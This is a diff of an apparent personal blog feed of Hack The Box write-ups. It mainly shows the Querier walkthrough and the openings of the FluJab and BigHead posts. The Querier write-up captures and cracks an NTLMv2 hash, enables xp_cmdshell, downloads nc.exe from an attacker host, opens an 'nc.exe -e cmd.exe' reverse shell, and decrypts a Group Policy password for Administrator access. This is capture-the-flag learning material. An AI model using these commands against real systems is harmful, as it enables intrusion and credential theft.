+conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+
+  ' MsgBox &quot;connection successful&quot;
+ 
+  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
+  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
+  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
+  rs.Close
+
+End If
+
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls 
+in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-we-got-connection-credentials-for-the-mssql-server-&quot;&gt;Great, we got connection credentials for the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
+&lt;h4 id=&quot;i-used-mssqlclientpy-from-impacket-to-connect-to-the-server-first-attempt-failed-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;mssqlclient.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to connect to the server. First attempt failed :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# /opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume 
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-added-the-windows-authentication-option--windows-auth-and-it-worked-&quot;&gt;I added the windows authentication option (&lt;code class=&quot;highlighter-rouge&quot;&gt;-windows-auth&lt;/code&gt;) and it worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;unfortunately--permission-denied-for-xp_cmdshell-&quot;&gt;Unfortunately … permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; enable_xp_cmdshell
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-ran-responder-responder--i-tun0-and-used-xp_dirtree-to-see-what-hashes-can-i-catch-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt;) and used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; to see what hashes can I catch :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
+[*] Skipping previously captured hash for QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : \gX
+[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
+[*] Skipping previously captured hash for \gX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-we-got-the-ntlmv2-hash-for-mssql-svc&quot;&gt;And we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;i-used-john-and-rockyou-to-crack-the-hash-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; to crack the hash :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+corporate568     (mssql-svc)
+1g 0:00:00:07 DONE (2019-06-21 07:41) 0.1321g/s 1184Kp/s 1184Kc/s 1184KC/s correforenz..corby909
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-its-time-to-enable-xp_cmdshell-and-get-a-reverse-shell&quot;&gt;Now it’s time to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; and get a reverse shell.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-rce-i-ran-a-python-server-to-host-ncexe-then-i-used-invoke-webrequest-to-download-it-&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt; to download it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
+output                                                                                                                                                                                                                                                            
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+NULL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-got-a-reverse-shell-&quot;&gt;Then I got a reverse shell :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;one-of-the-things-to-check-when-enumerating-windows-machines-is-group-policy-passwords-which-happened-to-be-the-privilege-escalation-vector-here-i-checked-group-policy-passwords-and-found-administrators-password-&quot;&gt;One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/hackthebox/querier/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;groupsxml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2019-01-28 23:12:48&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userContext=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;removePolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;policyApplied=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Properties&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-still-need-to-decrypt-the-password-which-can-be-easily-done-using-gpp-decrypt-&quot;&gt;We still need to decrypt the password which can be easily done using &lt;code class=&quot;highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+MyUnclesAreMarioAndLuigi!!1!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;password-is-myunclesaremarioandluigi1-we-can-use-it-with-psexecpy-from-impacket-and-get-a-shell-as-system-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;. We can use it with &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and get a shell as system :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;second-write-up--hack-the-box---querier-commando&quot;&gt;Second write-up : &lt;a href=&quot;/hack-the-box/querier-2&quot;&gt;Hack The Box - Querier (Commando)&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post here. It’s a Windows box and its ip is 10.10.10.125, I added it to /etc/hosts as querier.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. Let’s check smb. Smb We need to list the shares first. I used smbclient : ``` smbclient –list //querier.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier/0.png" /></entry><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-&quot;&gt;Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability. &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel was installed on the box and I could get credentials for it by exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLi&lt;/code&gt;,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt; then I escaped &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; and exploited a vulnerable version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.124&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -4426,336 +4738,4 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="Reverse Engineering" /><category term="egghunting" /><category term="Buffer Overflow" /><category term="Windows Exploitation" /><category term="Exploit Development" /><category term="LFI" /><category term="RCE" /><category term="Forensics" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="code analysis" /><category term="Python" /><category term="php" /><summary type="html">Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I'm a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 